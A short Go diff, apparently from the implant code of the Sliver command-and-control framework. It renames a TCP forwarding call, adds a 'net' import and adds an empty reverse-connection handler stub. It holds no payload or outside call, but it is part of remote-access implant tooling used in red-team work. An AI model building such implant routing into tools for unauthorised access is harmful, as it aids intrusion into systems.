@@ -21,6 +21,8 @@ package comm
 import (
 	// {{if .Config.Debug}}
 	"log"
+	"net"
+
 	// {{end}}
 	"fmt"
 	"io"
@@ -105,7 +107,7 @@ func routeForwardConn(route *route, cc *sliverpb.ConnectionInfo, stream io.ReadW
 		switch cc.Transport {
 		case sliverpb.TransportProtocol_TCP:
 			// case "tcp", "mtls", "http", "https", "socks", "socks5":
-			err := handleTCP(cc, stream)
+			err := dialTCP(cc, stream)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("Error dialing TCP: %s:%d -> %s:%d", cc.LHost, cc.LPort, cc.RHost, cc.RPort)
@@ -130,4 +132,7 @@ func routeForwardConn(route *route, cc *sliverpb.ConnectionInfo, stream io.ReadW
 	if len(route.Nodes) > 1 {
 		// Route to right comm
 	}
+}
+
+func routeHandleReverse(handlerID string, conn net.Conn) {
 }
